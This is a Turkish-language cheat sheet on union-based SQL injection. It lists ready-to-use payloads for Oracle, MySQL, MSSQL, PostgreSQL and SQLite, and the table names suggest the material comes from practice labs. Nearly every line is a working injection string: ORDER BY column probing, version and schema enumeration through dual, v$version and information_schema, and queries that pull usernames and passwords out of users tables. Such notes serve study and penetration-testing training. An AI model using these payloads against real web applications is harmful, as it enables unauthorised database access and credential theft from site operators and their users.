# Union-Based SQL Injection

### Tanım

UNION SQL Injection, bir SQL sorgusuna eklenen `UNION` komutu ile birleştirilen başka bir sorgunun çıktısını alır. Bu şekilde saldırgan, veritabanındaki hassas verileri öğrenebilir veya ek komutlar çalıştırabilir.

#### Örnek Sorgu:
- Normal SQL sorgusu:
    ```sql
    SELECT * FROM products WHERE category = 'Gifts' AND released = 1;
    ```

- Enjeksiyonlu Sorgu:
    ```sql
    SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL, NULL, NULL--;
    ```
    - **UNION SELECT NULL, NULL, NULL** komutu, veritabanından dönen sonuç sayısının aynı olması için sorguya eklenir.
    - **--** SQL’de yorum satırı başlatır ve geri kalan sorguyu devre dışı bırakır.

#### ' ORDER BY 3--' - "ORDER BY" İfadesiyle Sıralama

- **' ORDER BY 3--** → Bu komutla, sorgu sonuçları 3. sütuna göre sıralanır. Eğer sorgu daha fazla sütun içeriyorsa, bu tür bir enjeksiyonla sütun sayısı hakkında bilgi edinilebilir.
  
- **' ORDER BY 1--'** → Bu komut ise birinci sütuna göre sıralama yapar.

### Oracle Veritabanı için UNION Injection
Oracle veritabanlarında UNION kullanarak bazı sistem bilgilerini almak mümkündür:

1. **' ORDER BY 1--** → Sorgu 1. sütuna göre sıralanır.
2. **' UNION SELECT 'abc', 'def' FROM dual--** → `dual` tablosu, Oracle veritabanlarında mevcut olup sabit bir kayıt içerir. Bu tür bir sorguyla, Oracle veritabanında test amaçlı sabit veriler döndürülebilir.
3. **' UNION SELECT BANNER, NULL FROM v$version--** → `v$version` tablosu, Oracle'ın versiyon bilgilerini içerir ve bu şekilde veritabanı versiyonu öğrenilebilir.
4. **' UNION SELECT table_name, NULL FROM all_tables--** → Bu sorgu, Oracle veritabanındaki tüm tablo adlarını alır.
5. **' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'--** → `USERS_ABCDEF` adlı tablonun sütunlarını sorgular.
6. **' UNION SELECT USERNAME_ABCDEF, PASSWORD_ABCDEF FROM USERS_ABCDEF--** → `USERS_ABCDEF` tablosundaki kullanıcı adı ve şifre bilgilerini alır.

### MySQL, MSSQL, PostgreSQL ve SQLite için UNION Injection

Farklı veritabanı sistemleri için benzer şekilde UNION SQL Injection kullanılabilir:

1. **' ORDER BY 1--** → Sorgu 1. sütuna göre sıralanır.
2. **' UNION SELECT 'abc', 'def'--** → Bu tür bir komutla test amacıyla sabit veriler döndürülebilir.
3. **' UNION SELECT @@version, NULL--** → MySQL gibi veritabanlarında versiyon bilgisini öğrenmek için kullanılabilir.
4. **' UNION SELECT table_name, NULL FROM information_schema.tables--** → Veritabanındaki tüm tablo isimlerini almak için kullanılır.
5. **' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcdef'--** → Belirtilen tablonun sütun adlarını almak için kullanılır.
6. **' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--** → `users_abcdef` tablosundaki kullanıcı adı ve şifre bilgilerini alır.

### Diğer Kullanım Örnekleri:

- **' UNION SELECT table_name, NULL FROM all_tables--** → Oracle'da tüm tablo isimlerini listelemek için kullanılabilir.
- **' UNION SELECT NULL, NULL, NULL--** → Sorguya hiçbir veri eklenmemesini sağlayarak veri türünü test eder.
- **' UNION SELECT 'abc', 'def'--** → Sabit veriler döndürür.
- **' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS'--** → `USERS` tablosundaki sütun adlarını almak için kullanılır.
- **' UNION SELECT username, password FROM users--** → `users` tablosundaki kullanıcı adı ve şifre bilgilerini alır.
- **' UNION SELECT NULL, username || '~' || password FROM users--** → `users` tablosundaki kullanıcı adı ve şifreyi birleştirerek alır.
